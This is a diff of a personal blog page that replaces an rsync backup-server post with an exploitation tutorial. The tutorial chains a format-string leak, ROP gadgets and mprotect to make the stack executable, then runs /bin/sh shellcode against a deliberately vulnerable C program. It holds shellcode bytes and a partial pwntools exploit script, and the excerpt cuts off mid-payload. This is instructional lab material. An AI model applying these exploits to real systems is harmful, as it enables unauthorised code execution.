@@ -11,7 +11,7 @@
 
   <title>
     
-      How I Made A Small Home Backup Server Using Rsync Over SSH &middot; Nihaal Prasad
+      Marking The Stack As Executable &middot; Nihaal Prasad
     
   </title>
 
@@ -184,7 +184,7 @@
 
     <main class="container">
       <div class="content">
-  <h1 class="page-heading">How I Made A Small Home Backup Server Using Rsync Over SSH</h1>
+  <h1 class="page-heading">Marking The Stack As Executable</h1>
   <div class="post-meta">
   <span class="post-categories">
     
@@ -193,106 +193,278 @@
 
   <hr>
   <div class="post-body">
-    <p>Have you ever been worried about losing your files? I definitely am. A little while back, I was working on a coding project for one of my computer science classes at college, when I realized that if something happened to my laptop, such as getting hit with a virus infection or being dropped, I could easily lose all of my hard work. Imagine how horrible it would be if you lost/damaged your school computer and didn’t have any backups!</p>
+    <p>The <a href="https://en.wikipedia.org/wiki/NX_bit">No-execute (NX) bit</a> allows operating systems to mark a page as “executable” or “non-executable.” A common method of bypassing this technique involves using <a href="https://nihaal-prasad.github.io/2020/10/14/return-oriented-programming-tutorial.html">return-oriented programming (ROP)</a>; however, there is another method that works as well. This method of defeating NX involves modifying the stack so that it is executable.</p>
 
-<p><img style="float: right;" src="../../../assets/img/2018-11-24-rsync-backup-server/Crying_GIF.gif" /></p>
+<p>The Linux function <a href="https://man7.org/linux/man-pages/man2/mprotect.2.html"><code class="highlighter-rouge">mprotect(void *addr, size_t len, int prot)</code></a> can be used to modify the access permissions of any page of memory. If an attacker can ROP to this function, he/she can use it to mark the stack as executable. Then he/she can jump to their shellcode on the stack, and because the stack has been marked as executable, the shellcode will execute without any problems.</p>
 
-<p>Since I didn’t want to ever have to deal with redoing an assignment, I decided that I would figure out how to make a simple backup server at home so that I could backup all of my files when I’m outside the house. After some research, I found a program called <a href="https://en.wikipedia.org/wiki/Rsync">rsync</a> that could easily sync your files with another computer over SSH. I’m now going to go over what I did to set this up.</p>
-
-<p>The only thing I needed (aside from the laptop that I was going to backup) was an SSH server. Since I only required enough memory to backup the things that I was doing in college and some other random files that I had on my computer, I didn’t need to buy some expensive server hardware. I had an old cheap <a href="https://www.cnet.com/products/dell-optiplex-380/specs/">Dell Optiplex 380 Desktop</a> sitting in my basement, which only had 2GB of RAM, a 256GB hard drive, and Ubuntu OS installed on it, and it worked just fine for this project (because they didn’t want it, one of my teachers from high school gave it to me as a prize for winning something, and it was just sitting in my basement since). Although I haven’t tried it, someone could also probably do the same thing by setting up the backup server in a <a href="https://www.raspberrypi.org/">Raspberry Pi</a> connected to an external hard drive.</p>
-
-<p><img style="margin-left: auto; margin-right: auto;" src="../../../assets/img/2018-11-24-rsync-backup-server/Dell Optiplex.jpg" /></p>
-
-<p>Anyways, the first thing that I did was setup an <a href="https://en.wikipedia.org/wiki/Secure_Shell">SSH server</a> on my desktop computer. Since I was going to be using rsync on top of SSH, it was important that I was able to get this SSH server up and running. I used <a href="https://en.wikipedia.org/wiki/OpenSSH">openSSH</a> because it’s free and open source. To install openssh, I used this command on my Desktop computer:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo apt-get install openssh-server
-</code></pre></div></div>
-<p>Once I installed the SSH server, it started running by default. I checked that SSH is working by SSHing into my computer.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh admin@localhost
-admin's password:
-&gt;
-</code></pre></div></div>
-<p>From there, I decided that I wanted to create a new user just for doing backups for security purposes.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ useradd backupuser
-$ passwd backupuser
-Changing password for user backupuser.
-New UNIX password:
-Retype new UNIX password:
-passwd: all authentication tokens updated successfully.
-</code></pre></div></div>
-<p>The next thing I wanted to do was to generate SSH keys on my laptop (which is NOT the same computer as the one that has the SSH server. This is the computer that I use for my school assignments).</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh-keygen -t rsa
-Generating public/private rsa key pair.
-Enter file in which to save the key (/home/user/.ssh/id_rsa): /home/user/.backups/id_rsa
-Created directory '/home/user/.backups/'.
-Enter passphrase (empty for no passphrase): 
-Enter same passphrase again: 
-Your identification has been saved in /home/user/.backups/id_rsa.
-Your public key has been saved in /home/user/.backups/id_rsa.pub.
-</code></pre></div></div>
-<p>I then copied the keys from my laptop onto where the SSH server was:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh-copy-id -i /home/user/.backups/id_rsa.pub backupuser@[internal ip address]
-</code></pre></div></div>
-<p>Now that the public key was copied, I was able to use passwordless SSH authentication to login to my SSH server. Next, I opened the server’s SSH config file (located at /etc/ssh/sshd_config) using vim to change some settings for the SSH server. I made sure that I denied the admin user from using SSH, which made sure that the backup user was the only user that could use SSH.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DenyUsers admin
-</code></pre></div></div>
-<p>I changed the banner to be the text inside the /etc/issue.net file. I also changed the /etc/issue.net file to say “ABSOLUTELY NO TRESPASSING” to anyone who tried to connect to the server.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Banner /etc/issue.net
-</code></pre></div></div>
-<p>Then I disabled X11 forwarding.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>X11Forwarding no
-</code></pre></div></div>
-<p>I disabled password authentication (it was no longer necessary after I copied the keys earlier).</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PasswordAuthentication no
-</code></pre></div></div>
-<p>I disabled root login because that could become a security risk.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PermitRootLogin no
-</code></pre></div></div>
-<p>I also changed the port number so that it would be harder to find (most port scanners will not scan for this port).</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Port 2222
-</code></pre></div></div>
-<p>Finally, after the SSH server was completely setup, I installed the rsync program on my laptop.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo apt-get install rsync
-</code></pre></div></div>
-<p>And then I wrote a simple script that would use the rsync program (which is displayed below). I saved the script as “backup.sh” and ran it as root.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo rsync -avz -e 'ssh -i /home/user/.backups/id_rsa -p 2222' --progress /home/user/Desktop/ backupuser@[internal ip address]:~/Desktop/
-sudo rsync -avz -e 'ssh -i /home/user/.backups/id_rsa -p 2222' --progress /home/user/Documents/ backupuser@[internal ip address]:~/Documents/
-sudo rsync -avz -e 'ssh -i /home/user/.backups/id_rsa -p 2222' --progress /home/user/Pictures/ backupuser@[internal ip address]:~/Pictures/
-</code></pre></div></div>
-<p>It successfully copied all of the files in my Desktop, Documents, and Pictures folders over to the SSH server’s folders. Our backup server has worked!</p>
-
-<p>There was still a tiny bit more work to do. At the moment, the server would only work if my laptop was on the same network as my server. However, if I moved my laptop to a separate network (such as my college’s WiFi network), it would not work properly. To fix this, I logged onto my router settings and port-forwarded port 2222, which is where my SSH server is listening. I then changed my backup.sh script to use my public ip address instead of my internal ip address, and tried again. It worked!</p>
-
-<p><img style="margin-left: auto; margin-right: auto;" src="../../../assets/img/2018-11-24-rsync-backup-server/port-forwarding.png" /></p>
-
-<p>There was another problem. My router currently has a dynamic IP address, meaning that its IP address could change at any moment. As a result, I would have to change the IP address in my script if it changed, which could become a little bit annoying. So I went ahead and created an account at <a href="https://www.noip.com/">No-IP</a>, which is a service that grants you up to five free domain names for someone that has a dynamic IP address (you can buy more domain names if you want, but you get five of them for free).</p>
-
-<p><img style="margin-left: auto; margin-right: auto;" src="../../../assets/img/2018-11-24-rsync-backup-server/no-ip.png" /></p>
-
-<p>It was pretty easy to navigate No-IP’s web interface (I promise this wasn’t sponsored). I just used the “quick add” option on the dashboard, setup my hostname and domain name (since I only had a free account, I had to use one of their premade domain names). Then I had to go to my router’s settings and tell my router where the Dynamic Domain Name Server was located so that every time my dynamic IP address changed, my router would alert No-IP to change which IP address the domain name is pointing to.</p>
-
-<p><img style="margin-left: auto; margin-right: auto;" src="../../../assets/img/2018-11-24-rsync-backup-server/dynamic dns.png" /></p>
-
-<p>After setting up my domain in No-IP’s website, I was able to use it to connect to my backup server anywhere in the world by using the domain name.</p>
-
-<p>There was just one more little thing I had to do. By default, only root is able to send a shutdown signal to the computer over SSH. In contrast, I wanted my backup user to also be able to use the poweroff command so that I could remotely power down my server after I was done with my backups. I went ahead and <a href="https://askubuntu.com/questions/1190/how-can-i-make-shutdown-not-require-admin-password/1399#1399">changed the policies in the /usr/share/polkit-1/actions/org.freedesktop.consolekit.policy file</a>, which gave my backup user permission to use the poweroff command. I also added one extra line in my backup.sh script so that I would automatically shut down the server once I was done with it, making my backup.sh script look like this:</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo rsync -avz -e 'ssh -i /home/user/.backups/id_rsa -p 2222' --progress /home/user/Desktop/ backupuser@[domain name I got from No-IP's website]:~/Desktop/
-sudo rsync -avz -e 'ssh -i /home/user/.backups/id_rsa -p 2222' --progress /home/user/Documents/ backupuser@[domain name I got from No-IP's website]:~/Documents/
-sudo rsync -avz -e 'ssh -i /home/user/.backups/id_rsa -p 2222' --progress /home/user/Pictures/ backupuser@[domain name I got from No-IP's website]:~/Pictures/
-ssh -i /home/user/.backups/id_rsa -p 2222 backupuser@[domain name I got from No-IP's website] "systemctl poweroff -i"
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Format string vuln: "</span><span class="p">);</span>
+    <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Stack overflow vuln: "</span><span class="p">);</span>
+    <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></div></div>
 
-<p>Finally, everything was completed. The backup server works quite well so far, and I am quite happy with its output.</p>
+<p>The code shown above has two vulnerabilities:</p>
+<ol>
+  <li>An information leak due to a format string vulnerability.</li>
+  <li>A stack buffer overflow.</li>
+</ol>
+
+<p>An attacker can take control over <code class="highlighter-rouge">RIP</code> after writing 120 bytes into the second call to <code class="highlighter-rouge">fgets()</code>.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s2">"import sys; sys.stdout.buffer.write(b'</span><span class="se">\n</span><span class="s2">' + b'A'*120 + b'BBBBBBBB')"</span> <span class="o">&gt;</span> input
+<span class="nv">$ </span>gdb <span class="nb">test
+</span>GNU gdb <span class="o">(</span>Debian 10.1-1.4<span class="o">)</span> 10.1
+Copyright <span class="o">(</span>C<span class="o">)</span> 2020 Free Software Foundation, Inc.
+
+<span class="o">[</span>...]
+
+gef➤  r &lt; input
+Starting program: /home/nihaal/Desktop/test/test &lt; input
+
+<span class="o">[</span>...]
+
+gef➤  info frame
+Stack level 0, frame at 0x7fffffffe018:
+ rip <span class="o">=</span> 0x5555555551bd <span class="k">in </span>main<span class="p">;</span> saved rip <span class="o">=</span> 0x4242424242424242
+ Arglist at 0x4141414141414141, args:
+ Locals at 0x4141414141414141, Previous frame<span class="s1">'s sp is 0x7fffffffe020
+ Saved registers:
+  rip at 0x7fffffffe018
+</span></code></pre></div></div>
+
+<p>In order to get this exploit to work, we’ll have to exploit the format string vulnerability to leak addresses from the stack. Then we can calculate the offsets of all other addresses that we need for our exploit.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  r
+Starting program: /home/nihaal/Desktop/test/test
+Format string vuln: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
+0x5555555596b1.<span class="o">(</span>nil<span class="o">)</span>.0x5555555596cf.0x7fffffffdfa0.0x7ffff7fadbe0.0x7fffffffe108.0x100000000.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.
+Stack overflow vuln:
+</code></pre></div></div>
+
+<p>After leaking the addresses, I used Ctrl-C to pause execution in GDB. Then I printed out the memory mapping.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  vmmap
+Start              End                Offset             Perm Path
+0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /home/nihaal/Desktop/test/test
+0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /home/nihaal/Desktop/test/test
+0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /home/nihaal/Desktop/test/test
+0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /home/nihaal/Desktop/test/test
+0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /home/nihaal/Desktop/test/test
+0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- <span class="o">[</span>heap]
+0x00007ffff7def000 0x00007ffff7e14000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
+0x00007ffff7e14000 0x00007ffff7f5f000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so
+0x00007ffff7f5f000 0x00007ffff7fa9000 0x0000000000170000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
+0x00007ffff7fa9000 0x00007ffff7faa000 0x00000000001ba000 <span class="nt">---</span> /usr/lib/x86_64-linux-gnu/libc-2.31.so
+0x00007ffff7faa000 0x00007ffff7fad000 0x00000000001ba000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
+0x00007ffff7fad000 0x00007ffff7fb0000 0x00000000001bd000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so
+0x00007ffff7fb0000 0x00007ffff7fb6000 0x0000000000000000 rw-
+0x00007ffff7fcc000 0x00007ffff7fd0000 0x0000000000000000 r-- <span class="o">[</span>vvar]
+0x00007ffff7fd0000 0x00007ffff7fd2000 0x0000000000000000 r-x <span class="o">[</span>vdso]
+0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
+0x00007ffff7fd3000 0x00007ffff7ff3000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so
+0x00007ffff7ff3000 0x00007ffff7ffb000 0x0000000000021000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
+0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
+0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so
+0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
+0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- <span class="o">[</span>stack]
+</code></pre></div></div>
+
+<p>Note that <code class="highlighter-rouge">0x7fffffffdfa0</code> is the third address leaked from the program (starting from zero), and it is <code class="highlighter-rouge">0x7fffffffdfa0 - 0x7ffffffde000 = 0x1ffa0</code> bytes away from the start of the stack. Also note that <code class="highlighter-rouge">0x7ffff7fadbe0</code>, the fourth address leaked from the stack, is <code class="highlighter-rouge">0x7ffff7fadbe0 - 0x7ffff7def000 = 0x1bebe0</code> bytes away from the base of libc. Another interesting thing to note is that the third address leaked from the program points to the start of our buffer.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  x/s 0x7fffffffdfa0
+0x7fffffffdfa0: <span class="s2">"%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.</span><span class="se">\n</span><span class="s2">"</span>
+gef➤  disas mprotect
+Dump of assembler code <span class="k">for function </span>mprotect:
+   0x00007ffff7ee7bc0 &lt;+0&gt;:     mov    eax,0xa
+   0x00007ffff7ee7bc5 &lt;+5&gt;:     syscall
+   0x00007ffff7ee7bc7 &lt;+7&gt;:     cmp    rax,0xfffffffffffff001
+   0x00007ffff7ee7bcd &lt;+13&gt;:    jae    0x7ffff7ee7bd0 &lt;mprotect+16&gt;
+   0x00007ffff7ee7bcf &lt;+15&gt;:    ret
+   0x00007ffff7ee7bd0 &lt;+16&gt;:    mov    rcx,QWORD PTR <span class="o">[</span>rip+0xc5299]        <span class="c"># 0x7ffff7face70</span>
+   0x00007ffff7ee7bd7 &lt;+23&gt;:    neg    eax
+   0x00007ffff7ee7bd9 &lt;+25&gt;:    mov    DWORD PTR fs:[rcx],eax
+   0x00007ffff7ee7bdc &lt;+28&gt;:    or     rax,0xffffffffffffffff
+   0x00007ffff7ee7be0 &lt;+32&gt;:    ret
+End of assembler dump.
+</code></pre></div></div>
+
+<p>The <code class="highlighter-rouge">mprotect()</code> function is at address <code class="highlighter-rouge">0x7ffff7ee7bc0</code>, which means that it comes <code class="highlighter-rouge">0x7ffff7ee7bc0 - 0x7ffff7def000 = 0xf8bc0</code> bytes after the base of libc. Our goal is to call <code class="highlighter-rouge">mprotect(void *addr, size_t len, int prot)</code>, where <code class="highlighter-rouge">addr</code> is the base of the stack, <code class="highlighter-rouge">len</code> is the length of the stack, and <code class="highlighter-rouge">prot</code> is set to <code class="highlighter-rouge">PROT_READ | PROT_WRITE | PROT_EXEC | PROT_GROWSDOWN</code> (look at the <a href="https://man7.org/linux/man-pages/man2/mprotect.2.html">manpage</a> for more information). In the <a href="https://aaronbloomfield.github.io/pdr/book/x86-64bit-ccc-chapter.pdf">x86_64 calling convention</a>, these parameters need to be passed into RDI, RSI, and RDX, respectively.</p>
+
+<p>We will need the following three ROP gadgets for moving these parameters into RDI, RSI, and RDX.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ropper <span class="nt">--file</span> /usr/lib/x86_64-linux-gnu/libc-2.31.so <span class="nt">--search</span> <span class="s2">"pop rdi"</span>
+
+<span class="o">[</span>...]
+
+0x0000000000026796: pop rdi<span class="p">;</span> ret<span class="p">;</span>
+
+<span class="nv">$ </span>ropper <span class="nt">--file</span> /usr/lib/x86_64-linux-gnu/libc-2.31.so <span class="nt">--search</span> <span class="s2">"pop rsi"</span>
+
+<span class="o">[</span>...]
+
+0x000000000002890f: pop rsi<span class="p">;</span> ret<span class="p">;</span>
+
+<span class="nv">$ </span>ropper <span class="nt">--file</span> /usr/lib/x86_64-linux-gnu/libc-2.31.so <span class="nt">--search</span> <span class="s2">"pop rdx"</span>
+
+<span class="o">[</span>...]
+
+0x00000000000cb16d: pop rdx<span class="p">;</span> ret<span class="p">;</span>
+</code></pre></div></div>
+
+<p>To figure out what <code class="highlighter-rouge">PROT_READ | PROT_WRITE | PROT_EXEC | PROT_GROWSDOWN</code> is actually equal to in hex, I wrote the following code in a file and compiled it.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/mman.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">mprotect</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="o">|</span> <span class="n">PROT_EXEC</span> <span class="o">|</span> <span class="n">PROT_GROWSDOWN</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>By looking at the object dump for this program, we can see that <code class="highlighter-rouge">PROT_READ | PROT_WRITE | PROT_EXEC | PROT_GROWSDOWN</code> is stored as <code class="highlighter-rouge">0x1000007</code> in hex.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0000000000001135 &lt;main&gt;:
+    1135:       55                      push   rbp
+    1136:       48 89 e5                mov    rbp,rsp
+    1139:       ba 07 00 00 01          mov    edx,0x1000007
+    113e:       be 00 00 00 00          mov    esi,0x0
+    1143:       bf 00 00 00 00          mov    edi,0x0
+    1148:       e8 e3 fe ff ff          call   1030 &lt;mprotect@plt&gt;
+    114d:       b8 00 00 00 00          mov    eax,0x0
+    1152:       5d                      pop    rbp
+    1153:       c3                      ret
+    1154:       66 2e 0f 1f 84 00 00    nop    WORD PTR cs:[rax+rax<span class="k">*</span>1+0x0]
+    115b:       00 00 00
+    115e:       66 90                   xchg   ax,ax
+</code></pre></div></div>
+
+<p>This is the shellcode that I will be using for my exploit.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>section .text ; Text section for code
+global _start ; Begins execution at _start
+_start:
+
+; Close STDIN
+xor rax, rax ; Clears the RAX register
+xor rdi, rdi ; Zero represents STDIN
+mov al, 3 ; Syscall number for close()
+syscall ; Calls close(0)
+
+; Opening "/dev/tty"
+push rax ; Push a string terminator onto the stack
+mov rdi, 0x7974742f7665642f ; Move "/dev/tty" (written backwards in ASCII) into RDI.
+                        ; We can move this all at once because the string is exactly 8 bytes long
+push rdi ; Push the string "/dev/tty" onto the stack.
+push rsp ; Push a pointer to the string onto the stack.
+pop rdi ; RDI now has a pointer to the string "/dev/tty"
+        ; These last two lines are equivalent to doing "mov rdi, rsp"
+push rax ; Push a NULL byte onto the stack
+pop rsi ; Make RSI NULL
+        ; These last two lines are equivalent to doing "mov rsi, 0"
+mov si, 0x2702 ; Flag for O_RDWR
+mov al, 0x2 ; Syscall for sys_open
+syscall ; calls sys_open("/dev/tty", O_RDWR)
+
+; Get 59 in RAX
+xor rax, rax ; Clear the RAX register
+mov al, 59 ; Syscall for execve
+
+; Push a string terminator onto the stack
+xor rbx, rbx ; Sets RBX to NULL
+push rbx ; Pushes a NULL byte onto the stack
+
+; Push /bin/sh onto the stack, and get a pointer to it in RDI
+mov ebx, 0x68732f6e ; Moves "n/sh" (written backwards in ASCII) into lower-end bits of RBX
+shl rbx, 16 ; Pushes "n/sh" to the left to make more room for 2 more bytes in RBX
+mov bx, 0x6962 ; Move "bi" into lower-end bits of RBX. RBX is now equal to "bin/sh" written backwards
+shl rbx, 16 ; Makes 2 extra bytes of room in RBX
+mov bh, 0x2f ; "Moves /" into RBX. RBX is now equal to "\x00/bin/sh" written backwards
+             ; Note that we are moving 0x2f into bh, not bl. So there is a NULL byte at the beginning
+push rbx ; Push the string onto the stack
+mov rdi, rsp ; Get a pointer to the string "\x00/bin/sh" in RDI
+add rdi, 1 ; Add one to RDI, which will get rid of the NULL byte at the beginning.
+           ; RDI now points to a string that equals "/bin/sh"
+
+; Make these values NULL
+xor rsi, rsi
+xor rdx, rdx
+
+; Call execve()
+syscall
+</code></pre></div></div>
+
+<p>The hexadecimal shellcode is obtained with the following commands.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nasm <span class="nt">-f</span> elf64 <span class="nt">-o</span> shell.o shell.asm
+<span class="nv">$ </span>ld <span class="nt">-o</span> shell shell.o
+<span class="nv">$ </span><span class="k">for </span>i <span class="k">in</span> <span class="k">$(</span>objdump <span class="nt">-m</span> i386:x86-64 <span class="nt">-D</span> shell |grep <span class="s2">"^ "</span> |cut <span class="nt">-f2</span><span class="k">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="se">\\\\</span>x<span class="nv">$i</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span> <span class="nb">echo</span>
+
+<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>ff<span class="se">\x</span>b0<span class="se">\x</span>03<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>50<span class="se">\x</span>48<span class="se">\x</span>bf<span class="se">\x</span>2f<span class="se">\x</span>64<span class="se">\x</span>65<span class="se">\x</span>76<span class="se">\x</span>2f<span class="se">\x</span>74<span class="se">\x</span>74<span class="se">\x</span>79<span class="se">\x</span>57<span class="se">\x</span>54<span class="se">\x</span>5f<span class="se">\x</span>50<span class="se">\x</span>5e<span class="se">\x</span>66<span class="se">\x</span>be<span class="se">\x</span>02<span class="se">\x</span>27<span class="se">\x</span>b0<span class="se">\x</span>02<span class="se">\x</span>0f<span class="se">\x</span>05<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>b0<span class="se">\x</span>3b<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>53<span class="se">\x</span>bb<span class="se">\x</span>6e<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>48<span class="se">\x</span>c1<span class="se">\x</span>e3<span class="se">\x</span>10<span class="se">\x</span>66<span class="se">\x</span>bb<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>48<span class="se">\x</span>c1<span class="se">\x</span>e3<span class="se">\x</span>10<span class="se">\x</span>b7<span class="se">\x</span>2f<span class="se">\x</span>53<span class="se">\x</span>48<span class="se">\x</span>89<span class="se">\x</span>e7<span class="se">\x</span>48<span class="se">\x</span>83<span class="se">\x</span>c7<span class="se">\x</span>01<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>f6<span class="se">\x</span>48<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>0f<span class="se">\x</span>05
+</code></pre></div></div>
+
+<p>Now we have all the pieces necessary to build a working exploit.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1"># Open the process
+</span><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./test"</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">PTY</span><span class="p">)</span>
+
+<span class="c1"># Calculate addresses
+</span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p."</span><span class="p">)</span>
+<span class="n">leaked_addresses</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)</span>
+<span class="n">shellcode_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaked_addresses</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">stack_base</span> <span class="o">=</span> <span class="n">shellcode_addr</span> <span class="o">-</span> <span class="mh">0x1ffa0</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaked_addresses</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1bebe0</span>
+<span class="n">mprotect_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xf8bc0</span>
+<span class="n">pop_rdx_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0xcb16d</span>
+<span class="n">pop_rsi_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x2890f</span>
+<span class="n">pop_rdi_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x26796</span>
+
+<span class="c1"># Generate shellcode
+</span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">b</span><span class="s">"</span><span class="se">\x48\x31\xc0\x48\x31\xff\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x48\x31\xc0\xb0\x3b\x48\x31\xdb\x53\xbb\x6e\x2f\x73\x68\x48\xc1\xe3\x10\x66\xbb\x62\x69\x48\xc1\xe3\x10\xb7\x2f\x53\x48\x89\xe7\x48\x83\xc7\x01\x48\x31\xf6\x48\x31\xd2\x0f\x05</span><span class="s">"</span>
+
+<span class="c1"># Generate payload
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x90</span><span class="s">'</span><span class="o">*</span><span class="p">(</span><span class="mi">120</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_addr</span><span class="p">)</span> <span class="c1"># POP RDX
